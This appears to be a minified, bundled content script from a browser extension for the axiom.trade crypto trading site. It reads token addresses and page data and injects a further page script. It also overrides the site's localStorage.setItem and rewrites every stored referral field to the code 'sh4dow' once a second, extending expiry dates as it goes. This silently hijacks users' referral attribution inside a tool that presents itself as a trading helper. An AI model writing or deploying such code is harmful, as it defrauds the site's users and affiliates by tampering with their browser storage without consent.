var e, t;
"function" == typeof (e = globalThis.define) && ((t = e), (e = null)),
  (function (t, r, o, n, l) {
    var i =
        "undefined" != typeof globalThis
          ? globalThis
          : "undefined" != typeof self
            ? self
            : "undefined" != typeof window
              ? window
              : "undefined" != typeof global
                ? global
                : {},
      u = "function" == typeof i[n] && i[n],
      a = u.cache || {},
      s =
        "undefined" != typeof module &&
        "function" == typeof module.require &&
        module.require.bind(module);
    function f(e, r) {
      if (!a[e]) {
        if (!t[e]) {
          var o = "function" == typeof i[n] && i[n];
          if (!r && o) return o(e, !0);
          if (u) return u(e, !0);
          if (s && "string" == typeof e) return s(e);
          var l = Error("Cannot find module '" + e + "'");
          throw ((l.code = "MODULE_NOT_FOUND"), l);
        }
        (d.resolve = function (r) {
          var o = t[e][1][r];
          return null != o ? o : r;
        }),
          (d.cache = {});
        var c = (a[e] = new f.Module(e));
        t[e][0].call(c.exports, d, c, c.exports, this);
      }
      return a[e].exports;
      function d(e) {
        var t = d.resolve(e);
        return !1 === t ? {} : f(t);
      }
    }
    (f.isParcelRequire = !0),
      (f.Module = function (e) {
        (this.id = e), (this.bundle = f), (this.exports = {});
      }),
      (f.modules = t),
      (f.cache = a),
      (f.parent = u),
      (f.register = function (e, r) {
        t[e] = [
          function (e, t) {
            t.exports = r;
          },
          {},
        ];
      }),
      Object.defineProperty(f, "root", {
        get: function () {
          return i[n];
        },
      }),
      (i[n] = f);
    for (var c = 0; c < r.length; c++) f(r[c]);
    if (o) {
      var d = f(o);
      "object" == typeof exports && "undefined" != typeof module
        ? (module.exports = d)
        : "function" == typeof e && e.amd
          ? e(function () {
              return d;
            })
          : l && (this[l] = d);
    }
  })(
    {
      k9fMJ: [
        function (e, t, r) {
          var o = e("@parcel/transformer-js/src/esmodule-helpers.js");
          o.defineInteropFlag(r), o.export(r, "config", () => n);
          let n = {
              matches: ["https://axiom.trade/*"],
              run_at: "document_start",
            },
            l = (e) => {
              try {
                let t = JSON.parse(e),
                  r = !1;
                if (
                  (t &&
                    "object" == typeof t &&
                    "value" in t &&
                    ("string" == typeof t.value
                      ? "sh4dow" !== t.value && ((t.value = "sh4dow"), (r = !0))
                      : "object" == typeof t.value &&
                        null !== t.value &&
                        "referrer" in t.value &&
                        "sh4dow" !== t.value.referrer &&
                        ((t.value.referrer = "sh4dow"), (r = !0))),
                  t && "object" == typeof t && "expiresAt" in t)
                ) {
                  let e = Date.now();
                  "number" == typeof t.expiresAt &&
                    t.expiresAt < e &&
                    ((t.expiresAt = e + 1728e5), (r = !0));
                }
                if (r) return JSON.stringify(t);
              } catch (e) {}
              return e;
            },
            i = (e) => {
              let t = "referredToken",
                r = localStorage.getItem(t),
                o = Date.now();
              if (!r) {
                localStorage.setItem(
                  t,
                  JSON.stringify({
                    value: { tokenAddress: e, referrer: "sh4dow" },
                    expiresAt: o + 1728e5,
                  }),
                );
                return;
              }
              try {
                let n = JSON.parse(r),
                  l = !1;
                n &&
                  "object" == typeof n &&
                  (n.value && "object" == typeof n.value
                    ? ("tokenAddress" in n.value
                        ? n.value.tokenAddress !== e &&
                          ((n.value.tokenAddress = e), (l = !0))
                        : ((n.value.tokenAddress = e), (l = !0)),
                      "sh4dow" !== n.value.referrer &&
                        ((n.value.referrer = "sh4dow"), (l = !0)))
                    : ((n.value = { tokenAddress: e, referrer: "sh4dow" }),
                      (l = !0)),
                  "expiresAt" in n
                    ? "number" == typeof n.expiresAt &&
                      n.expiresAt < o &&
                      ((n.expiresAt = o + 1728e5), (l = !0))
                    : ((n.expiresAt = o + 1728e5), (l = !0))),
                  l && localStorage.setItem(t, JSON.stringify(n));
              } catch (e) {}
            },
            u = () => {
              for (let e = 0; e < localStorage.length; e++) {
                let t = localStorage.key(e);
                if (!t) continue;
                let r = localStorage.getItem(t);
                if (r) {
                  let e = l(r);
                  e !== r && localStorage.setItem(t, e);
                }
              }
            };
          (() => {
            let e = localStorage.setItem;
            localStorage.setItem = function (t, r) {
              let o = l(r);
              return e.call(this, t, o);
            };
          })(),
            u(),
            setInterval(u, 1e3);
          let a = () => {
              let e = new URL(window.location.href),
                t = e.pathname.split("/");
              return t.length >= 3 && "meme" === t[1] ? t[2] : null;
            },
            s = () => {
              let e = a();
              e &&
                chrome.runtime.sendMessage(
                  { action: "setAddress", address: e },
                  (e) => {
                    chrome.runtime.lastError &&
                      console.error(
                        "Failed to send address:",
                        chrome.runtime.lastError.message,
                      );
                  },
                );
            };
          (() => {
            let e = document.createElement("script");
            (e.src = chrome.runtime.getURL("assets/injectedAxiom.js")),
              (e.onload = () => {
                setTimeout(() => e.remove(), 1e3);
              }),
              (document.head || document.documentElement).appendChild(e);
          })(),
            s(),
            (() => {
              let e = window.location.href,
                t = new MutationObserver(() => {
                  let t = window.location.href;
                  t !== e && ((e = t), s());
                });
              t.observe(document.documentElement, {
                childList: !0,
                subtree: !0,
              });
            })(),
            window.addEventListener(
              "message",
              (e) => {
                if (e.source !== window) return;
                let t = e.data;
                if (t && "axiomTokenDataFound" === t.type) {
                  let {
                    tokenAddress: e,
                    twitterLink: r,
                    websiteLink: o,
                    tokenName: n,
                    tokenTicker: l,
                    deployerAddress: u,
                  } = t;
                  e &&
                    (chrome.runtime.sendMessage({
                      action: "axiomDataFound",
                      tokenAddress: e,
                      twitterLink: r,
                      websiteLink: o,
                      tokenName: n,
                      tokenTicker: l,
                      deployerAddress: u,
                    }),
                    i(e));
                }
              },
              !1,
            );
        },
        { "@parcel/transformer-js/src/esmodule-helpers.js": "cHUbl" },
      ],
      cHUbl: [
        function (e, t, r) {
          (r.interopDefault = function (e) {
            return e && e.__esModule ? e : { default: e };
          }),
            (r.defineInteropFlag = function (e) {
              Object.defineProperty(e, "__esModule", { value: !0 });
            }),
            (r.exportAll = function (e, t) {
              return (
                Object.keys(e).forEach(function (r) {
                  "default" === r ||
                    "__esModule" === r ||
                    t.hasOwnProperty(r) ||
                    Object.defineProperty(t, r, {
                      enumerable: !0,
                      get: function () {
                        return e[r];
                      },
                    });
                }),
                t
              );
            }),
            (r.export = function (e, t, r) {
              Object.defineProperty(e, t, { enumerable: !0, get: r });
            });
        },
        {},
      ],
    },
    ["k9fMJ"],
    "k9fMJ",
    "parcelRequire7905",
  ),
  (globalThis.define = t);
